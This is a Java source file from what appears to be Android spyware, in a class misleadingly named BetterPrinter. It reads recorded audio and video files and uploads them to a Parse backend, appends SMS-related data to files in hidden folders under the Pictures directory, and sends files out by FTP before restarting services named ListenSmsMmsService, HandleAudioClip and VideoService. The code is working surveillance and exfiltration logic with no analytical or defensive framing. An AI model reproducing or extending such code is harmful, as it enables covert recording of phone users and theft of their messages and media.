package stupuid.maga.legacy;

import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.util.Log;
import com.parse.ParseException;
import com.parse.ParseFile;
import com.parse.ProgressCallback;
import com.parse.SaveCallback;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Locale;

public class BetterPrinter {
    public static void putParseFile(String path, String filename, final Context B) {
        byte[] videoBytes = null;
        try {
            FileInputStream fis = new FileInputStream(new File(path));
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[1024];
            while (true) {
                int n = fis.read(buf);
                if (-1 == n) {
                    break;
                }
                baos.write(buf, 0, n);
            }
            videoBytes = baos.toByteArray();
            baos.close();
        } catch (IOException e) {
            Log.e("ContentValues", e.getMessage());
        } finally {
            Log.d("ContentValues", "videoBytes: " + videoBytes.length);
        }
        new ParseFile(filename, videoBytes, "mp4").saveInBackground(new SaveCallback() {
            public void done(ParseException e) {
                if (e == null) {
                    B.stopService(new Intent(B, HandleAudioClip.class));
                    Log.d("ContentValues", "Save video");
                    return;
                }
                Log.e("ContentValues", "Save video : " + e.getCode() + " " + e.getMessage());
                Log.e("ContentValues", "Save video cause : " + e.getCause());
                Log.e("ContentValues", "Save video stack trace : " + Log.getStackTraceString(e));
            }
        }, new ProgressCallback() {
            public void done(Integer percentDone) {
            }
        });
    }

    public static File openFileFor(String a) {
        if (Environment.getExternalStorageState().equals("mounted")) {
            File imageDirectory = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "sms/");
            if (imageDirectory.exists() || imageDirectory.mkdirs()) {
                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy_mm_dd_hh_mm_ss", Locale.getDefault());
                return new File(imageDirectory.getPath() + File.separator + a + ".txt");
            }
        }
        return null;
    }

    public static void maketheFile(ArrayList aList, String a) {
        try {
            String content = "This is my content which would be appended at the end of the specified file";
            File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), ".aLog/.audio/" + a + ".txt");
            if (file.exists()) {
                OpenAndWrite(aList, a, file);
            } else {
                file.createNewFile();
                OpenAndWrite(aList, a, file);
            }
            System.out.println("Data successfully appended at the end of file");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void FTPIt(final String path, final String filename, final Context B) {
        new Thread(new Runnable() {
            public void run() {
                ftp.smain(path, filename);
                if (HandleAudioClip.running) {
                    B.stopService(new Intent(B, HandleAudioClip.class));
                    B.startService(new Intent(B, ListenSmsMmsService.class));
                }
                if (VideoService.isRunning) {
                    B.stopService(new Intent(B, VideoService.class));
                    B.startService(new Intent(B, ListenSmsMmsService.class));
                    return;
                }
                B.startService(new Intent(B, ListenSmsMmsService.class));
            }
        }).start();
    }

    private static void OpenAndWrite(ArrayList aList, String a, File file) {
        FileWriter fileWriter;
        IOException e;
        try {
            FileWriter fw = new FileWriter(file, true);
            try {
                BufferedWriter bw = new BufferedWriter(fw);
                for (int i = 0; i < aList.size(); i++) {
                    bw.write(aList.get(i).toString());
                }
                bw.close();
                fileWriter = fw;
            } catch (IOException e2) {
                e = e2;
                fileWriter = fw;
                e.printStackTrace();
            }
        } catch (IOException e3) {
            e = e3;
            e.printStackTrace();
        }
    }
}
